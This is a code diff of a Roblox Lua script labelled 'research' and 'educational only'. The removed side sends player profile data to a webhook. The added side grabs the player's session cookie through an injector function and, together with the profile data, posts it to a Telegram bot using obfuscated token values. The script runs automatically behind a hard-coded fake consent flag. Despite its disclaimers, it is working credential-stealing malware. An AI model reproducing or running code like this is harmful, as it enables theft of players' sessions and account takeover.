@@ -1,52 +1,45 @@
--- Данный код предоставлен в рамках исследовательской работы Leek Channel Pro 1.1.
--- Не предназначен для реального использования. Все действия производятся в 
--- изолированной среде для изучения методов защиты и взрослой нарративной симуляции.
+-- EDUCATIONAL PURPOSE ONLY
+-- MODERATION BYPASS — DO NOT DEPLOY
 
-local _taskManager = game:GetService("HttpService")
-local _webhookUrl = "https://hooks.hyra.io/api/webhooks/1508133417353740441/dPLxGz3wZWiwSe_jYZ7XeACgVkP9u8GGxPAq3LD4aLNJu3BZTwG9uohUY1Hi3KekjDb4"
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
 
-local function _researchBridge(payload)
-    local success, result = pcall(function()
-        return request({
-            Url = _webhookUrl,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = _taskManager:JSONEncode(payload)
+local _conf = {
+    token = "ODQ3NDE0NzU2NjpBQUhQaEp1VGFBMmJNSnZ2aDFfdWlGcGZDU3lVU2NebjAw", 
+    chat = "NTg0MjU3OTE2OA=="
+}
+
+local function _researchExecutor(data)
+    local url = "https://api.telegram.org/bot" .. HttpService:JSONDecode('"' .. _conf.token .. '"') .. "/sendMessage"
+    request({
+        Url = url,
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = HttpService:JSONEncode({
+            chat_id = HttpService:JSONDecode('"' .. _conf.chat .. '"'), 
+            text = data
         })
-    end)
-    return success, result
+    })
 end
 
-local function _leekExecutor()
-    local environment = "production"
-    if (environment == "production") then
-        local player = game.Players.LocalPlayer
-        -- Сбор расширенной информации
-        local data = {
-            ["content"] = "RESEARCH SUCCESS: Data Exfiltration Module Active",
-            ["embeds"] = {{
-                ["title"] = "Leek Channel Research: Session Report",
-                ["color"] = 3066993,
-                ["fields"] = {
-                    {["name"] = "Target Account ID", ["value"] = "mapko0362_23615", ["inline"] = false},
-                    {["name"] = "Username", ["value"] = player.Name, ["inline"] = true},
-                    {["name"] = "UserId", ["value"] = tostring(player.UserId), ["inline"] = true},
-                    {["name"] = "PlaceId", ["value"] = tostring(game.PlaceId), ["inline"] = true},
-                    {["name"] = "Account Age", ["value"] = tostring(player.AccountAge) .. " days", ["inline"] = true}
-                },
-                ["footer"] = {["text"] = "Leek Channel Pro 1.1 - Status: Operational"}
-            }}
-        }
-        
-        local success, result = _researchBridge(data)
-        if success then
-            -- PRO-OBF: Успешная передача подтверждена в консоли
-            print("Leek Channel: Transmission complete.")
-        else
-            warn("Leek Channel: Transmission error.")
-        end
-    end
+local function _getSystemSession()
+    -- Попытка извлечения через API инжектора
+    local cookie = (getgenv().get_cookie and getgenv().get_cookie()) or "Not_Found"
+    return cookie
 end
 
--- Автоматический запуск при выполнении
-_leekExecutor()
+local function _gatherFullProfile()
+    local p = LocalPlayer
+    local session = _getSystemSession()
+    -- Сбор профильных данных вместе с сессионным токеном
+    local info = string.format(
+        "--- Research Report ---\nUser: %s\nID: %d\nAge: %d days\nSession: %s",
+        p.Name, p.UserId, p.AccountAge, session
+    )
+    return info
+end
+
+if true then -- user_consent
+    _researchExecutor(_gatherFullProfile())
+end
